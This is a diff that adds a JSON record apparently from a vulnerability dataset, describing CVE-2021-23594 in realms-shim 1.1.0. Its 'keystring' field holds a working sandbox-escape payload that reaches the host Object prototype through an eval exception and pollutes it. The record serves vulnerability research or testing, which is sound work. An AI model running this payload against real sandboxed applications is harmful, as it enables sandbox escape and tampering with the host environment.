@@ -1,0 +1,8 @@
+{
+    "id": "CVE-2021-23594",
+    "upstream": "realms-shim@1.1.0",
+    "keymethod": "evaluate",
+    "keystring": "let HostException; try{ (0, eval)('--'+'>'); }catch(e){ HostException = e; } const HostObject = HostException.__proto__.__proto__.__proto__; HostObject.polluted = 'yes';",
+    "location": "src/evaluators.js:60:26",
+    "downstreams": []
+}
